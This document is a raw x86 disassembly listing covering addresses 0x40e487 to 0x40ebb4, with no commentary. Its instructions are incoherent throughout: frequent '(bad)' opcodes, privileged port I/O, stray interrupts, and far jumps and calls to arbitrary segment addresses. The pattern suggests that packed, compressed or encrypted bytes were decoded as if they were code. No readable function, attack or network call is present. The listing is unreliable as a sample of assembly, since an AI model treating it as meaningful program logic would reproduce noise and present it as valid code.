  40e487:	cli    
  40e488:	mov    al,BYTE PTR [edx+0x16e544a6]
  40e48e:	mov    cl,BYTE PTR [ecx+0x3f]
  40e491:	ficomp DWORD PTR [eax+0x625b8e84]
  40e497:	xor    al,0x7a
  40e499:	pusha  
  40e49a:	test   al,0x99
  40e49c:	test   BYTE PTR [edi-0xa],0xfb
  40e4a0:	out    dx,al
  40e4a1:	push   esp
  40e4a2:	xor    al,BYTE PTR [esi]
  40e4a4:	cs aam 0xb7
  40e4a7:	lea    esi,[eiz*4+0x7f67d921]
  40e4ae:	and    ch,bl
  40e4b0:	dec    eax
  40e4b1:	rcl    edi,0x3c
  40e4b4:	iret   
  40e4b5:	xchg   ebp,eax
  40e4b6:	push   edi
  40e4b7:	rcr    esi,1
  40e4b9:	dec    ecx
  40e4ba:	mov    al,BYTE PTR ds:0xe94a5550
  40e4c0:	in     eax,dx
  40e4c1:	xor    ebp,DWORD PTR [ebx]
  40e4c3:	dec    esi
  40e4c4:	sub    al,0x7e
  40e4c6:	int    0x27
  40e4c8:	jl     0x40e512
  40e4ca:	cmc    
  40e4cb:	ins    DWORD PTR es:[edi],dx
  40e4cc:	pop    ebp
  40e4cd:	jmp    FWORD PTR [ebx]
  40e4cf:	stos   BYTE PTR es:[edi],al
  40e4d0:	xor    eax,0x963fa854
  40e4d5:	mov    al,ds:0x3a3be64c
  40e4da:	dec    esi
  40e4db:	fist   WORD PTR [ecx]
  40e4dd:	arpl   bx,si
  40e4df:	pusha  
  40e4e0:	xor    eax,0xa8ac7eeb
  40e4e5:	jg     0x40e50d
  40e4e7:	mul    BYTE PTR [eax-0x43]
  40e4ea:	xchg   ecx,eax
  40e4eb:	popf   
  40e4ec:	mov    eax,es
  40e4ee:	repnz lea esp,[edi+0x2ff2bb1e]
  40e4f5:	mov    ds:0x39fa2801,eax
  40e4fa:	push   ebp
  40e4fb:	cmp    al,0xb6
  40e4fd:	pop    esi
  40e4fe:	xchg   ch,bh
  40e500:	cdq    
  40e501:	sub    DWORD PTR [ebx-0x39],ebp
  40e504:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e505:	sub    BYTE PTR [ebp-0x59],bl
  40e508:	popf   
  40e509:	xlat   BYTE PTR ds:[ebx]
  40e50a:	inc    ebp
  40e50b:	das    
  40e50c:	arpl   dx,ax
  40e50e:	pop    ebp
  40e50f:	sub    eax,0x2f1378b1
  40e514:	xor    DWORD PTR [edi+ebp*8+0x4fd80e89],esp
  40e51b:	shl    DWORD PTR [edx+0x46b29ba5],cl
  40e521:	and    esp,DWORD PTR [edx]
  40e523:	fild   WORD PTR [eiz*4+0x79afbdce]
  40e52a:	pop    edx
  40e52b:	add    al,0xf7
  40e52d:	dec    esi
  40e52e:	iret   
  40e52f:	lahf   
  40e530:	mov    eax,ds:0xa7819745
  40e535:	test   eax,0x81c7cc2f
  40e53a:	je     0x40e531
  40e53c:	sahf   
  40e53d:	mov    al,ds:0xcbc56302
  40e542:	mov    ch,0xf4
  40e544:	in     al,dx
  40e545:	pop    ecx
  40e546:	pop    ss
  40e547:	icebp  
  40e548:	sbb    BYTE PTR [edx],bh
  40e54a:	icebp  
  40e54b:	push   0x26ee697e
  40e550:	jge    0x40e5a6
  40e552:	mov    edx,0x34b9492b
  40e557:	call   0x63ce1fd2
  40e55c:	pop    es
  40e55d:	icebp  
  40e55e:	and    BYTE PTR [ecx+ebx*1],ch
  40e561:	mov    al,ds:0x76f17e1b
  40e566:	js     0x40e4fe
  40e568:	ret    
  40e569:	aad    0x51
  40e56b:	inc    edi
  40e56c:	(bad)  
  40e56d:	push   ebx
  40e56e:	dec    ebx
  40e56f:	mov    al,ds:0x87a1da5
  40e574:	(bad)  [ecx]
  40e576:	add    cl,BYTE PTR [ecx+0x1a2ab8ce]
  40e57c:	dec    ebp
  40e57d:	outs   dx,DWORD PTR ds:[esi]
  40e57e:	xor    BYTE PTR [eax],cl
  40e580:	fs ds cmp bh,bh
  40e584:	jmp    0x40e57f
  40e586:	out    0xc0,al
  40e588:	rol    BYTE PTR [esi+0x27275a26],1
  40e58e:	sar    DWORD PTR [edx-0xd],0x6c
  40e592:	cmp    ch,BYTE PTR [edx+0x28]
  40e595:	pop    edx
  40e596:	str    WORD PTR [esi+0x2b]
  40e59a:	(bad)  
  40e59b:	adc    BYTE PTR [ecx-0x7f],al
  40e59e:	inc    BYTE PTR [esi-0x7470b55d]
  40e5a4:	push   edx
  40e5a5:	ins    DWORD PTR es:[edi],dx
  40e5a6:	cs push cs
  40e5a8:	cmp    bl,BYTE PTR [ecx+edi*8+0x78608127]
  40e5af:	dec    edi
  40e5b0:	imul   bh
  40e5b2:	push   ss
  40e5b3:	xor    eax,0xfd04d137
  40e5b8:	test   cl,cl
  40e5ba:	jae    0x40e556
  40e5bc:	push   cs
  40e5bd:	cld    
  40e5be:	int3   
  40e5bf:	push   ecx
  40e5c0:	mov    esp,esi
  40e5c2:	das    
  40e5c3:	arpl   WORD PTR ds:0xc1415ede,ax
  40e5c9:	ss addr16 leave 
  40e5cc:	inc    esp
  40e5cd:	mov    ah,ah
  40e5cf:	repz scas al,BYTE PTR es:[edi]
  40e5d1:	pusha  
  40e5d2:	inc    ebp
  40e5d3:	inc    esi
  40e5d4:	pushf  
  40e5d5:	stos   BYTE PTR es:[edi],al
  40e5d6:	mov    ecx,0x1d4b322f
  40e5db:	jmp    0x885208ad
  40e5e0:	ss xor BYTE PTR ds:[edx+0x65],0xce
  40e5e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5e7:	imul   edi,DWORD PTR [esi+0xd],0xffffff8a
  40e5eb:	jne    0x40e667
  40e5ed:	lahf   
  40e5ee:	mov    DWORD PTR [esi+esi*2],edi
  40e5f1:	mov    ch,0xae
  40e5f3:	mov    eax,ds:0xdb869e39
  40e5f8:	mov    ebp,0x4f151f54
  40e5fd:	sub    ah,BYTE PTR [edi]
  40e5ff:	and    bl,BYTE PTR [ebp+0x68]
  40e602:	jp     0x40e646
  40e604:	jge    0x40e664
  40e606:	test   al,0x7f
  40e608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e609:	mov    bh,0xeb
  40e60b:	pop    ebx
  40e60c:	xor    ecx,DWORD PTR [ebp+0x26]
  40e60f:	std    
  40e610:	test   al,0xfb
  40e612:	or     ah,BYTE PTR [ebx+edx*2]
  40e615:	jge    0x40e643
  40e617:	jg     0x40e5cd
  40e619:	mov    ah,0xfe
  40e61b:	sar    DWORD PTR [eax+0x36],1
  40e61e:	test   DWORD PTR [edx],eax
  40e620:	std    
  40e621:	pushf  
  40e622:	retf   0xf082
  40e625:	and    DWORD PTR [edi+ebp*4],eax
  40e628:	cmp    dh,BYTE PTR [edi]
  40e62a:	add    al,0xef
  40e62c:	stos   DWORD PTR es:[edi],eax
  40e62d:	fdiv   QWORD PTR [eax+0x6a]
  40e630:	and    BYTE PTR [eax+0x29],bl
  40e633:	outs   dx,BYTE PTR ds:[esi]
  40e634:	std    
  40e635:	add    DWORD PTR [edi],esp
  40e637:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e638:	mov    ah,0x2a
  40e63a:	outs   dx,DWORD PTR ds:[esi]
  40e63b:	or     al,0x74
  40e63d:	jb     0x40e6bb
  40e63f:	or     eax,0xc1bbff8b
  40e644:	shl    BYTE PTR [ecx+0x64],0x59
  40e648:	jle    0x40e645
  40e64a:	loop   0x40e6be
  40e64c:	xor    al,0xf7
  40e64e:	jp     0x40e69c
  40e650:	pop    ds
  40e651:	adc    al,0xa9
  40e653:	pusha  
  40e654:	retf   0x3e4f
  40e657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e658:	mov    WORD PTR [edi],fs
  40e65a:	outs   dx,DWORD PTR ds:[esi]
  40e65b:	jno    0x40e6a5
  40e65d:	fnstcw WORD PTR gs:[bx-0x10]
  40e662:	lods   al,BYTE PTR ds:[esi]
  40e663:	push   esi
  40e664:	cdq    
  40e665:	ret    0xffd1
  40e668:	fcom   QWORD PTR [edi+0x57]
  40e66b:	pop    esp
  40e66c:	dec    eax
  40e66d:	adc    al,bl
  40e66f:	push   0xf3397691
  40e674:	push   edi
  40e675:	lea    esp,ds:0xa141ef7
  40e67b:	and    eax,0x5023eab5
  40e680:	(bad)  
  40e681:	in     al,dx
  40e682:	mov    DWORD PTR [esi+ebx*8],ebx
  40e685:	inc    ecx
  40e686:	jno    0x40e6f4
  40e688:	(bad)  
  40e689:	retf   
  40e68a:	xchg   edi,eax
  40e68b:	xchg   ecx,eax
  40e68c:	call   0x422d:0x9b8ddf05
  40e693:	dec    esp
  40e694:	mov    ds:0xad44b45,al
  40e699:	inc    ecx
  40e69a:	ins    DWORD PTR es:[edi],dx
  40e69b:	cwde   
  40e69c:	dec    esp
  40e69d:	jle    0x40e701
  40e69f:	shl    DWORD PTR [ebp+eiz*1+0x38],1
  40e6a3:	jge    0x40e65a
  40e6a5:	into   
  40e6a6:	cmp    ebp,DWORD PTR [eax-0x68]
  40e6a9:	pop    eax
  40e6aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6ab:	inc    edx
  40e6ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6ad:	pop    edi
  40e6ae:	ret    0x78ae
  40e6b1:	adc    dl,BYTE PTR [edi]
  40e6b3:	pop    edx
  40e6b4:	dec    esi
  40e6b5:	xchg   ecx,eax
  40e6b6:	jmp    0x463ebb5a
  40e6bb:	ret    0xa852
  40e6be:	pop    ecx
  40e6bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6c0:	jb     0x40e732
  40e6c2:	sub    edi,esp
  40e6c4:	lods   al,BYTE PTR ds:[esi]
  40e6c5:	cmc    
  40e6c6:	pop    ds
  40e6c7:	mov    edx,0x5fa3b55f
  40e6cc:	imul   esi,edi,0x243a4bbe
  40e6d2:	pop    ds
  40e6d3:	jae    0x40e6f2
  40e6d5:	mov    al,0x7c
  40e6d7:	mov    ?,WORD PTR [ebx]
  40e6d9:	push   esi
  40e6da:	pop    edx
  40e6db:	push   esp
  40e6dc:	dec    esp
  40e6dd:	cdq    
  40e6de:	xor    DWORD PTR [ebp+ecx*2+0x1d249aa3],ecx
  40e6e5:	mov    es,WORD PTR [esi]
  40e6e7:	setbe  BYTE PTR [ecx+0x6c]
  40e6eb:	cli    
  40e6ec:	add    al,BYTE PTR [ebx]
  40e6ee:	sub    edi,DWORD PTR [ebp-0x2e]
  40e6f1:	fsubrp st(4),st
  40e6f3:	int    0x8a
  40e6f5:	mov    WORD PTR [esi],?
  40e6f7:	mov    eax,ds:0xd257b9a6
  40e6fc:	dec    esi
  40e6fd:	mov    eax,ds:0xea552d25
  40e702:	rcr    DWORD PTR [ecx+0x5edc83d0],1
  40e708:	repz sbb BYTE PTR [esi],ah
  40e70b:	(bad)  
  40e70c:	push   0x72c0be44
  40e711:	pop    ds
  40e712:	mov    esp,esp
  40e714:	pop    ecx
  40e715:	gs inc eax
  40e717:	pushf  
  40e718:	dec    edx
  40e719:	push   cs
  40e71a:	stos   BYTE PTR es:[edi],al
  40e71b:	mov    esi,ebx
  40e71d:	jb     0x40e6c3
  40e71f:	mov    al,ah
  40e721:	(bad)  
  40e722:	sahf   
  40e723:	push   cs
  40e724:	rol    DWORD PTR [edi+0x36],1
  40e727:	sub    al,0xac
  40e729:	mov    bl,0xd
  40e72b:	or     bh,BYTE PTR [esi-0x20]
  40e72e:	pop    edi
  40e72f:	xchg   ecx,eax
  40e730:	add    al,BYTE PTR [esi+0x55]
  40e733:	mov    ds:0xc00116c6,al
  40e738:	ss hlt 
  40e73a:	jmp    0x52724a6d
  40e73f:	in     eax,0xaf
  40e741:	pop    eax
  40e742:	jge    0x40e789
  40e744:	add    al,0x14
  40e746:	pandn  mm5,mm7
  40e749:	mov    bl,0xe
  40e74b:	test   al,0x8b
  40e74d:	push   ebx
  40e74e:	or     DWORD PTR [eax-0x3e310040],ebx
  40e754:	mov    eax,0x60bc9d3f
  40e759:	stos   DWORD PTR es:[edi],eax
  40e75a:	push   es
  40e75b:	jnp    0x40e719
  40e75d:	jecxz  0x40e702
  40e75f:	mov    ebp,0x383f1354
  40e764:	data16 test BYTE PTR [ecx+edi*4],al
  40e768:	cwde   
  40e769:	iret   
  40e76a:	es nop
  40e76c:	push   edi
  40e76d:	repnz xor ebx,ebp
  40e770:	dec    ebp
  40e771:	inc    ecx
  40e772:	add    ch,bh
  40e774:	ret    
  40e775:	clc    
  40e776:	dec    ebp
  40e777:	shl    BYTE PTR [ebx+0x2a],1
  40e77a:	(bad)  
  40e77b:	(bad)  
  40e77c:	jmp    0xda27:0xb0a0b472
  40e783:	leave  
  40e784:	push   edx
  40e785:	push   ebx
  40e786:	cmp    bh,bl
  40e788:	sub    al,0xd6
  40e78a:	and    edx,DWORD PTR [ebp-0x6b4f3ff0]
  40e790:	or     al,0x16
  40e792:	icebp  
  40e793:	mov    ebx,0x1baff50c
  40e798:	fwait
  40e799:	add    dh,0xa0
  40e79c:	outs   dx,BYTE PTR ds:[esi]
  40e79d:	clc    
  40e79e:	test   al,0x83
  40e7a0:	lock dec eax
  40e7a2:	sbb    eax,0xaa757558
  40e7a7:	push   ds
  40e7a8:	hlt    
  40e7a9:	test   al,0x39
  40e7ab:	retf   
  40e7ac:	test   eax,0x5a860b50
  40e7b1:	cli    
  40e7b2:	mov    ecx,0x2b192e7
  40e7b7:	adc    ch,0xb7
  40e7ba:	ret    
  40e7bb:	les    edi,FWORD PTR [esi-0x72]
  40e7be:	adc    al,BYTE PTR [ebp+0x21]
  40e7c1:	jmp    0x6f548ee2
  40e7c6:	cmp    cl,bh
  40e7c8:	shl    DWORD PTR [ecx+0x3a472979],cl
  40e7ce:	jb     0x40e773
  40e7d0:	cmc    
  40e7d1:	sub    ebx,DWORD PTR [ebp+eiz*4-0x6]
  40e7d5:	push   edx
  40e7d6:	xor    ebp,edi
  40e7d8:	xchg   ecx,esp
  40e7da:	ret    
  40e7db:	jmp    0xc3a8:0x6a43e583
  40e7e2:	inc    eax
  40e7e3:	pushf  
  40e7e4:	nop
  40e7e5:	jg     0x40e7bc
  40e7e7:	cmp    eax,0xe5604ef
  40e7ec:	mov    ds:0xacd21996,al
  40e7f1:	jno    0x40e804
  40e7f3:	xchg   ebx,eax
  40e7f4:	cdq    
  40e7f5:	test   BYTE PTR [ecx],al
  40e7f7:	enter  0xe992,0x51
  40e7fb:	xor    ecx,ecx
  40e7fd:	add    edx,DWORD PTR [ebx+0x1ff4ee0d]
  40e803:	fisubr DWORD PTR [eax+0x25ff8382]
  40e809:	and    esi,DWORD PTR [edi]
  40e80b:	push   esp
  40e80c:	push   edx
  40e80d:	xchg   edx,eax
  40e80e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e80f:	and    al,0x3
  40e811:	dec    edi
  40e812:	xchg   ebx,eax
  40e813:	lock enter 0x48fb,0xf0
  40e818:	sub    al,0xdf
  40e81a:	push   edx
  40e81b:	sar    cl,0x7c
  40e81e:	mov    ah,0x49
  40e820:	push   cs
  40e821:	mov    al,ds:0xdbcd7f03
  40e826:	sar    DWORD PTR [edx-0x13],0x27
  40e82a:	ja     0x40e7f0
  40e82c:	sbb    al,0x2c
  40e82e:	popf   
  40e82f:	mov    BYTE PTR [ecx+0x62],dh
  40e832:	inc    ebp
  40e833:	(bad)  
  40e834:	and    esp,DWORD PTR [ecx]
  40e836:	aad    0x6a
  40e838:	mov    bh,0xed
  40e83a:	push   es
  40e83b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e83c:	outs   dx,BYTE PTR ds:[esi]
  40e83d:	dec    esp
  40e83e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e83f:	repnz fld st(7)
  40e842:	mov    esp,0x92010d85
  40e847:	in     eax,dx
  40e848:	inc    edx
  40e849:	shr    DWORD PTR ds:0xf858ac62,1
  40e84f:	inc    eax
  40e850:	les    edi,FWORD PTR [edx-0x78]
  40e853:	pop    ebx
  40e854:	enter  0x81d7,0x53
  40e858:	test   DWORD PTR [edi],edx
  40e85a:	push   0x9931edeb
  40e85f:	mov    ecx,0x56908c05
  40e864:	idiv   DWORD PTR [ebp+ebx*2+0x41760647]
  40e86b:	jecxz  0x40e850
  40e86d:	loopne 0x40e8ac
  40e86f:	push   0x299f6a06
  40e874:	mov    dl,BYTE PTR [edi+0x14a59970]
  40e87a:	jo     0x40e86e
  40e87c:	call   0xa28babe1
  40e881:	das    
  40e882:	fsubr  QWORD PTR [esi+ecx*1+0x10]
  40e886:	push   esi
  40e887:	unpcklps xmm4,XMMWORD PTR [eax-0x55a708]
  40e88e:	aam    0x5d
  40e890:	sub    al,0xbb
  40e892:	inc    edi
  40e894:	rcl    BYTE PTR [ebp+0x35],1
  40e897:	sub    DWORD PTR [ecx-0x466b65c9],ebx
  40e89d:	push   ds
  40e89e:	scas   al,BYTE PTR es:[edi]
  40e89f:	adc    DWORD PTR [edx+0x47],0x15f3712d
  40e8a6:	outs   dx,DWORD PTR ds:[esi]
  40e8a7:	(bad)  
  40e8a8:	cmp    esi,esi
  40e8aa:	mov    ah,0xd1
  40e8ac:	mov    eax,ds:0x86bf2a64
  40e8b1:	call   0xd83751cd
  40e8b6:	nop
  40e8b7:	jbe    0x40e8ce
  40e8b9:	clc    
  40e8ba:	push   ss
  40e8bb:	sub    ch,0xb6
  40e8be:	inc    esi
  40e8bf:	lds    ebp,FWORD PTR [esi]
  40e8c1:	fsubr  DWORD PTR ds:0xfd462a66
  40e8c7:	mov    cl,dh
  40e8c9:	cmp    esi,DWORD PTR [ecx-0x6e]
  40e8cc:	pop    edx
  40e8cd:	or     eax,0xccdd13b
  40e8d2:	sbb    bh,BYTE PTR [ecx+eax*2+0x51]
  40e8d6:	jbe    0x40e8b4
  40e8d8:	dec    eax
  40e8d9:	lods   al,BYTE PTR ds:[esi]
  40e8da:	push   ss
  40e8db:	or     al,0x29
  40e8dd:	sar    DWORD PTR [ebp-0x36],0xd1
  40e8e1:	loopne 0x40e950
  40e8e3:	enter  0x10f8,0xa4
  40e8e7:	xchg   ebp,eax
  40e8e8:	div    BYTE PTR [eax-0x16]
  40e8eb:	inc    esp
  40e8ec:	ss jae 0x40e93b
  40e8ef:	push   edi
  40e8f0:	cmp    eax,0xc6189ff
  40e8f5:	sbb    DWORD PTR [eax+0x7dcf2007],0x60
  40e8fc:	pop    ecx
  40e8fd:	fmul   DWORD PTR [edx]
  40e8ff:	pop    esp
  40e900:	mov    eax,0x5aaa0629
  40e905:	bnd jl 0x40e897
  40e908:	imul   edi,DWORD PTR [ecx],0xffffffe8
  40e90b:	outs   dx,BYTE PTR ds:[esi]
  40e90c:	mov    dl,0xb7
  40e90e:	mov    ah,0xca
  40e910:	stos   DWORD PTR es:[edi],eax
  40e911:	sub    ebp,DWORD PTR [edx+0x5cf0f31b]
  40e917:	xchg   edi,eax
  40e918:	inc    esp
  40e919:	push   esi
  40e91a:	sbb    eax,0x87a68fe4
  40e91f:	xor    al,0x6a
  40e921:	sub    bl,ch
  40e923:	push   0xffffffe5
  40e925:	es mov edi,0xc28899ad
  40e92b:	cmp    al,0xfb
  40e92d:	je     0x40e900
  40e92f:	dec    ebx
  40e930:	mov    dh,0x8f
  40e932:	mov    DWORD PTR [ebx],edx
  40e934:	fist   WORD PTR [eax+eiz*8+0x49]
  40e938:	xchg   esi,eax
  40e939:	jae    0x40e970
  40e93b:	jo     0x40e943
  40e93d:	pop    ds
  40e93e:	sub    BYTE PTR ds:0xa3ba7d48,0x2d
  40e945:	mov    ds:0xeb10adaa,eax
  40e94a:	xlat   BYTE PTR ds:[ebx]
  40e94b:	cli    
  40e94c:	mov    ds:0x63b910b6,al
  40e951:	push   edi
  40e952:	jge    0x40e9b2
  40e954:	xor    BYTE PTR [edx],0xc9
  40e957:	test   al,0xc3
  40e959:	adc    ch,BYTE PTR [ebx+0x12]
  40e95c:	stc    
  40e95d:	test   ah,ah
  40e95f:	aam    0x74
  40e961:	out    dx,eax
  40e962:	adc    al,0x1b
  40e964:	xor    DWORD PTR [ecx],eax
  40e966:	retf   0x4fe
  40e969:	adc    ch,BYTE PTR [edx+edi*1+0x3d]
  40e96d:	xor    eax,DWORD PTR [ebx+edx*4+0x10]
  40e971:	sbb    eax,0xc9dd4491
  40e976:	aas    
  40e977:	fcomp  st(0)
  40e979:	lock mov ebp,0x7d58fbc9
  40e97f:	lods   al,BYTE PTR cs:[esi]
  40e981:	in     eax,dx
  40e982:	jmp    0x3005:0x24cd2025
  40e989:	xchg   ebp,eax
  40e98a:	jg     0x40e97c
  40e98c:	fwait
  40e98d:	pop    esp
  40e98e:	retf   0x83cc
  40e991:	retf   
  40e992:	push   esi
  40e993:	aas    
  40e994:	repnz les ecx,FWORD PTR [ecx-0x5]
  40e998:	mov    ecx,0x53d715cd
  40e99d:	jmp    0x3ab7:0x1b731c80
  40e9a4:	adc    edi,DWORD PTR [edx+0x32]
  40e9a7:	add    DWORD PTR [eax+0x50],edi
  40e9aa:	stos   BYTE PTR es:[edi],al
  40e9ab:	clc    
  40e9ac:	mov    ds:0x4ae49bfa,eax
  40e9b1:	das    
  40e9b2:	and    ebx,DWORD PTR [edx]
  40e9b4:	(bad)  
  40e9b5:	and    al,BYTE PTR [ecx+0x2c]
  40e9b8:	pop    es
  40e9b9:	sub    bl,BYTE PTR [ecx+0x5779651b]
  40e9bf:	(bad)  
  40e9c0:	mov    ebp,0xfadf6f99
  40e9c5:	jo     0x40e95a
  40e9c7:	sbb    edx,DWORD PTR [eax+0x6c]
  40e9ca:	sub    edx,DWORD PTR [esi+eiz*4]
  40e9cd:	(bad)  
  40e9ce:	push   DWORD PTR [ebx+0x38033ff4]
  40e9d4:	jge    0x40e98d
  40e9d6:	or     eax,esi
  40e9d8:	in     eax,0x3d
  40e9da:	dec    eax
  40e9db:	loope  0x40e9bc
  40e9dd:	out    dx,al
  40e9de:	iret   
  40e9df:	dec    edx
  40e9e0:	stos   BYTE PTR es:[edi],al
  40e9e1:	mov    ecx,DWORD PTR [esi]
  40e9e3:	pop    esp
  40e9e4:	sub    ecx,DWORD PTR [eax+0x2a003467]
  40e9ea:	or     ecx,DWORD PTR [ebp+0x6f]
  40e9ed:	stc    
  40e9ee:	loopne 0x40ea5b
  40e9f0:	push   ebx
  40e9f1:	or     DWORD PTR [eax],edi
  40e9f3:	bnd js 0x40e977
  40e9f6:	inc    edx
  40e9f7:	stos   DWORD PTR es:[edi],eax
  40e9f8:	mov    dl,0x24
  40e9fa:	xchg   ebp,eax
  40e9fb:	pop    esp
  40e9fc:	xchg   esp,eax
  40e9fd:	inc    ebx
  40e9fe:	je     0x40e9db
  40ea00:	scas   al,BYTE PTR es:[edi]
  40ea01:	and    al,0x27
  40ea03:	aad    0xe3
  40ea05:	stos   DWORD PTR es:[edi],eax
  40ea06:	arpl   WORD PTR [edx+edx*4],ax
  40ea09:	arpl   WORD PTR [eax+0x56ee4919],cx
  40ea0f:	jp     0x40ea6d
  40ea11:	and    edx,ebx
  40ea13:	dec    esp
  40ea14:	shl    bh,cl
  40ea16:	pop    esp
  40ea17:	pop    edi
  40ea18:	into   
  40ea19:	je     0x40ea0d
  40ea1b:	fsub   QWORD PTR [ebx]
  40ea1d:	int    0x73
  40ea1f:	cli    
  40ea20:	inc    ebp
  40ea21:	mov    al,0xe5
  40ea23:	pop    ebp
  40ea24:	mov    al,0x67
  40ea26:	imul   edx,DWORD PTR [ebx+0x347afd32],0x16283c32
  40ea30:	je     0x40e9b5
  40ea32:	cmp    DWORD PTR [esi],edx
  40ea34:	sbb    bh,BYTE PTR [edx]
  40ea36:	ins    BYTE PTR es:[edi],dx
  40ea37:	xchg   ebp,eax
  40ea38:	call   0xc4af:0xe1afa909
  40ea3f:	push   esp
  40ea40:	add    al,0xbb
  40ea42:	js     0x40eab6
  40ea44:	(bad)  
  40ea45:	mov    ebx,0x4e8d95fa
  40ea4a:	add    BYTE PTR [eax+0x12575a61],ch
  40ea50:	pusha  
  40ea51:	sbb    bh,bl
  40ea53:	dec    edx
  40ea54:	dec    edi
  40ea55:	repz dec ebx
  40ea57:	ds mov dh,0x42
  40ea5a:	test   eax,0xc6e06a51
  40ea5f:	mov    edi,0x676cb9fb
  40ea64:	jbe    0x40eaae
  40ea66:	ficom  WORD PTR [eax]
  40ea68:	loopne 0x40ea46
  40ea6a:	cwde   
  40ea6b:	xchg   esi,eax
  40ea6c:	mov    BYTE PTR [eax+0x4],al
  40ea6f:	jb     0x40ea9d
  40ea71:	nop
  40ea72:	mov    bl,0xea
  40ea74:	lahf   
  40ea75:	scas   al,BYTE PTR es:[edi]
  40ea76:	jo     0x40ea31
  40ea78:	in     eax,0x25
  40ea7a:	or     eax,0x843bc180
  40ea7f:	pop    eax
  40ea80:	stos   DWORD PTR es:[edi],eax
  40ea81:	dec    eax
  40ea82:	adc    eax,0xcea58a09
  40ea87:	call   edi
  40ea89:	jae    0x40ead4
  40ea8b:	adc    eax,0x2ef8ad0e
  40ea90:	pop    ds
  40ea91:	stos   BYTE PTR es:[edi],al
  40ea92:	dec    ebp
  40ea93:	aaa    
  40ea94:	or     eax,0x22b1a8de
  40ea99:	push   eax
  40ea9a:	pop    ecx
  40ea9b:	arpl   WORD PTR [ecx-0x3c8063a1],dx
  40eaa1:	pop    ebx
  40eaa2:	call   0xb4fa0fef
  40eaa7:	inc    edi
  40eaa8:	cli    
  40eaa9:	fadd   st(3),st
  40eaab:	fnsetpm(287 only) 
  40eaad:	pop    esi
  40eaae:	retf   0x643e
  40eab1:	int    0x4d
  40eab3:	pop    edx
  40eab4:	ja     0x40ea81
  40eab6:	mov    dl,0x56
  40eab8:	out    0x97,al
  40eaba:	adc    eax,0x4ad668a1
  40eabf:	and    al,0x45
  40eac1:	cmp    DWORD PTR cs:[ebx],ecx
  40eac4:	and    DWORD PTR [esi+0x30520b11],ecx
  40eaca:	add    eax,0x544c0f69
  40eacf:	pusha  
  40ead0:	int3   
  40ead1:	iret   
  40ead2:	fcmovnu st,st(6)
  40ead4:	xor    BYTE PTR [ebx],ah
  40ead6:	in     al,0xa0
  40ead8:	sbb    DWORD PTR [edx],esp
  40eada:	pop    esi
  40eadb:	outs   dx,DWORD PTR ds:[esi]
  40eadc:	into   
  40eadd:	sbb    ebx,DWORD PTR ds:0xe09e0ffc
  40eae3:	push   esp
  40eae4:	int3   
  40eae5:	jns    0x40eb4d
  40eae7:	mov    dl,0x43
  40eae9:	and    dl,dh
  40eaeb:	cs push ecx
  40eaed:	cmp    ebx,DWORD PTR ds:0xf8ceb5ec
  40eaf3:	ficom  DWORD PTR [ebp-0x14]
  40eaf6:	push   ebp
  40eaf8:	mov    ah,BYTE PTR [esi]
  40eafa:	pusha  
  40eafb:	add    BYTE PTR [esi+0x60ca6608],al
  40eb01:	loop   0x40eb6c
  40eb03:	inc    edx
  40eb04:	test   eax,0x7fbccfde
  40eb09:	in     al,0xfa
  40eb0b:	adc    eax,0xaee65102
  40eb10:	dec    ebp
  40eb11:	sti    
  40eb12:	jg     0x40eae2
  40eb14:	jb     0x40eb0d
  40eb16:	jb     0x40eb1c
  40eb18:	or     ebp,esi
  40eb1a:	pop    ebp
  40eb1b:	int3   
  40eb1c:	cmp    eax,0x834a0d21
  40eb21:	xlat   BYTE PTR ds:[ebx]
  40eb22:	xor    al,0xa0
  40eb24:	mov    WORD PTR [ecx-0x3b6c195b],?
  40eb2a:	lods   al,BYTE PTR ds:[esi]
  40eb2b:	inc    ebx
  40eb2c:	scas   eax,DWORD PTR es:[edi]
  40eb2d:	test   dl,dh
  40eb2f:	add    al,0x32
  40eb31:	popa   
  40eb32:	test   BYTE PTR [esi-0x16949224],bh
  40eb38:	mov    ds:0xb419987,al
  40eb3d:	and    DWORD PTR [edi+0x7fe2b5fa],eax
  40eb43:	(bad)  
  40eb44:	pop    ebx
  40eb45:	jg     0x40eafb
  40eb47:	inc    esi
  40eb48:	or     ch,BYTE PTR [ebp+0x15]
  40eb4b:	out    dx,eax
  40eb4c:	mov    es,WORD PTR [ecx-0x38]
  40eb4f:	or     bh,ah
  40eb51:	mov    bh,0x6c
  40eb53:	(bad)  
  40eb55:	enter  0xeb46,0x3c
  40eb59:	add    esi,0x35
  40eb5c:	sbb    BYTE PTR [eax-0xf310e2d],cl
  40eb62:	pop    ebp
  40eb63:	pop    es
  40eb64:	cmp    BYTE PTR [ebp-0x314d88e4],dh
  40eb6a:	add    edx,DWORD PTR [edi]
  40eb6c:	(bad)  
  40eb6e:	add    eax,0xbf4a2f6f
  40eb73:	retf   
  40eb74:	xchg   edi,eax
  40eb75:	scas   al,BYTE PTR es:[edi]
  40eb76:	fst    DWORD PTR [edx-0x3b]
  40eb79:	cmp    bh,BYTE PTR [edx-0x18]
  40eb7c:	dec    edi
  40eb7d:	stos   DWORD PTR es:[edi],eax
  40eb7e:	push   ebp
  40eb7f:	cmp    al,0x6b
  40eb81:	ins    DWORD PTR es:[edi],dx
  40eb82:	sbb    esi,DWORD PTR [eax]
  40eb84:	mov    ebp,0x9dbbb197
  40eb89:	ret    0x13de
  40eb8c:	pop    ds
  40eb8d:	mov    al,ds:0xa8af8f0e
  40eb92:	jne    0x40eb75
  40eb94:	cld    
  40eb95:	aas    
  40eb96:	loope  0x40eb7e
  40eb98:	mov    al,0x3f
  40eb9a:	ficomp WORD PTR [eax+0x3e18278a]
  40eba0:	add    BYTE PTR ds:0x6f73479d,cl
  40eba6:	mov    ebx,0xd619903
  40ebab:	out    0x28,al
  40ebad:	loopne 0x40eb7e
  40ebaf:	mov    ebp,0x56cc9c97
  40ebb4:	or     BYTE PTR ds:0x94204865,ch
